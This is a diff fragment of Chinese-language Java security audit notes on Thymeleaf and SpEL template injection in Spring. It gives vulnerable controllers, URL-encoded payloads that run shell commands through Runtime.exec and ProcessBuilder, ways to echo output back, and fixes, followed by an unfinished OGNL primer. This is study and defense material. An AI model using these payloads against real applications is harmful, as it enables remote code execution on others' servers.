+        - Contorller ：可控点变为了selector位置
+
+        - ```java
+            @GetMapping("/fragment")
+            public String fragment(@RequestParam String section) {
+                return "welcome :: " + section; //fragment is tainted
+            }
+            ```
+
+        - payload
+
+            ```java
+            /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20executed%22).getInputStream()).next()%7d__::.x
+            ```
+
+        - 其实这里也可以不需要`.x`和`::`也可触发命令执行
+
+    - 关于回显问题：
+
+        - 上面两种payload注入点不同会导致有无回显，也可以说是controller代码给予我们的可控参数不同，
+        - **回显是在抛出异常的时候**
+            - **找不到templatename是存在结果回显的**
+            - **而找不到selector不存在结果回显**
+
+    - **URI path**
+
+        - ```java
+            @GetMapping("/doc/{document}")
+            public void getDocument(@PathVariable String document) {
+                log.info("Retrieving " + document);
+                //returns void, so view name is taken from URI
+            }
+            ```
+
+        - 因为返回值为空，所以viewTemplateName会从uri中获取，直接在`{document}`位置传入payload即可
+
+        - ```
+            http://localhost:8090/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.x
+            ```
+
+        - 构造回显
+
+            - 这里其实和0x01类似，templatename部分可控，**没回显的原因在于defaultView中对URI path的处理，我们可以在最后加两个`.`**
+
+            -  ```
+                 /doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::..
+                 ```
+
+            - **payload最后是必须要`.x`**，看一下为什么，之前在`applyDefaultViewName`部分有提到`defaultViewName`这个值，因为mav返回值为空，所以viewTemplateName会从uri中获取，我们看下是如何处理`defaultViewName`的，调试之后发现在`getViewName`方法中调用`transformPath`对URL中的`path`进行了处理
+                - 重点在于第3个if中`stripFilenameExtension`方s法
+                - /org/springframework/util/StringUtils#stripFilenameExtension该**方法会对后缀做一个清除**
+                - 如果我们传入的payload没有`.x`的话，例如`http://localhost:8090/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::`最后会被处理成`/doc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a calculator").getInputStream())`从而没有了`::`无法进入预处理导致无法执行任意代码。
+                - 所以这里即使是在最后只加个`.`也是可以的，不一定必须是`.x`
+
+- ##### 其他姿势
+
+    >  https://xz.aliyun.com/t/9826#toc-5
+
+    - `::` 位置
+
+        - 除了上面利用`.`替换`.x`以外（ModelAndView为null，从URI中获取viewname）在templatename中`::`的位置也不是固定的，这个看之前的代码逻辑即可知晓，比如可以替换成下面的poc,将`::`放在最前面：
+
+            - ```
+                ::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
+                ```
+
+            - 但是这样就没有回显了
+
+    -  POST方式
+
+    - 省略`__`
+
+        - 当Controller如下配置时，可以省略`__`包裹
+
+            - ```
+                @RequestMapping("/path")
+                public String path2(@RequestParam String lang) {
+                    return lang; //template path is tainted
+                }
+                
+                ```
+
+        - **poc，也不局限于用`${}`,用*{expr}及\*{{expr}} 也同样可以**
+
+    - 
+
+##### 修复方案
+
+1. 配置 `@ResponseBody` 或者 `@RestController`
+
+    1. 这样 spring 框架就不会将其解析为视图名，而是直接返回, 不再调用模板解析。不过不太现实，模板还是要用的。
+
+    2. ```
+        @GetMapping("/safe/fragment")
+        @ResponseBody
+        public String safeFragment(@RequestParam String section) {
+            return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
+        }
+        ```
+
+2. 在返回值前面加上 **"redirect:"**
+
+    1. 这样不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析。
+
+        1. ```
+            @GetMapping("/safe/redirect")
+            public String redirect(@RequestParam String url) {
+                return "redirect:" + url; //FP as redirects are not resolved as expressions
+            }
+            
+            ```
+
+3. 在方法参数中加上 HttpServletResponse 参数
+
+    - 由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析。和一样，还是不太现实。
+
+    - ```
+        @GetMapping("/safe/doc/{document}")
+        public void getDocument(@PathVariable String document, HttpServletResponse response) {
+            log.info("Retrieving " + document); //FP
+        }
+        ```
+
+Thymeleaf平常更多的使用姿势还是在于将变量渲染到前端页面而不是类似于输入模版名称去动态返回模版文件，可能实战遇到的并不会很多吧
+
 #### Velocity
 
-` Velocity.evaluate`
+##### sink
+
+- ` Velocity.evaluate`
 
 ```java
 @RequestMapping("/ssti/velocity")
@@ -8261,6 +9140,8 @@ configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
 但这并不是一劳永逸的防御方式，如果配置不当，依然会造成安全问题：
 
 [Freemarker模板注入 Bypass](https://xz.aliyun.com/t/4846)
+
+
 
 ### 5. RCE
 
@@ -8631,6 +9512,7 @@ poc
 
     - ```url
         input=#{new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "GBK").useDelimiter("lyy9").next()}
+        
         #Scanner#useDelimiter方法使用指定的字符串分割输出，这里给不可能出现的字符串即可，就会让所有的字符都在第一行，然后执行next方法即可获得所有输出。
         
         ```
@@ -8803,7 +9685,53 @@ SpringCloud Function 简述
 
 还有其它种类的表达式，如EL，不会轻易造成安全问题，暂时略过；OGNL表达式会在struts2相关的漏洞中详细说明。
 
-2. 
+#### OGNL表达式
+
+- 对象导航图语言（Object Graph Navigation Language），简称OGNL，是应用于Java中的一个开源的表达式语言（Expression Language），它被集成在Struts2等框架中，作用是对数据进行访问，它拥有类型转换、访问对象方法、操作集合对象等功能。
+
+###### 基本语法和使用
+
+- OGNL 支持链式调用, 是以 “.”（点号）进行串联的一个链式字符串表达式。
+
+- 例子
+
+    - ```
+        // 伪代码
+        class people{
+            name = "zhang san"
+            fullName = {"zhang","san"}
+            getAge(){
+            	return "18"
+            }
+        }
+        ```
+
+- | Expression Element(元素) Part | Example                                               |
+    | ----------------------------- | ----------------------------------------------------- |
+    | Property(属性) names          | 获取 people 的 name 属性，可用：people.name 表示      |
+    | Method Calls                  | 获取 people 的 age 属性，可用：people.getName() 表 示 |
+    | Array Indices(数组索引)       | 获取 people 的姓氏 ，可用 people.fullName[0] 表示     |
+
+- 三要素 通俗理解理解就和解语文的阅读理解题一样，需要搞清楚 
+
+    - 故事：OGNL 表达式，表示执行什么操作 人物：
+    - OGNL ROOt对象，表示被操作的对象是谁 地点：
+    - OGNL 上下文环境，表示执行操作的环境在哪
+
+- 常见符号介绍
+
+    - | 操作符 | 说明 |
+        | ------ | ---- |
+        | .      |      |
+        | @      |      |
+        |        |      |
+        |        |      |
+        |        |      |
+        |        |      |
+        |        |      |
+        |        |      |
+
+        
 
 ## 动态/静态审计工具
 
